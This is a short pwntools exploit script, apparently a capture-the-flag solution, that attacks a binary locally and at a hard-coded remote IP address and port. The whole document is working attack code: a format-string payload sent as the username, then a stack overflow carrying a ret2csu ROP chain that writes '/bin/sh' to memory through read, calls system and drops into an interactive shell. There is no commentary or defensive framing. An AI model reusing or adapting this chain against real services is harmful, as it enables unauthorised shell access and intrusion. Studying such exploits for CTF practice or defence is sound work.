from pwn import*
context.log_level ='DEBUG'
p= process('./main')
p = remote('183.129.189.60',10001)
p.sendlineafter('username:','%*18$d%5$n')
#gdb.attach(p,"b *0x401512")
p.sendline('1')
pop_rdi_ret = 0x401733
pop_rsi_r15 = 0x401731
binsh  =0x404090
system = 0x401110
read_got = 0x404038
gadget_I = 0x40172A
gadget_Ii = 0x401710
payload  = 'U'*0x118
payload += p64(gadget_I)
payload += p64(0)
payload += p64(1)
payload += p64(0)
payload += p64(binsh)
payload += p64(8)
payload += p64(read_got)
payload += p64(gadget_Ii)
payload += p64(0)*7
payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)
p.recvuntil('message')
p.sendline(payload)
p.send('/bin/sh\x00')
p.interactive()
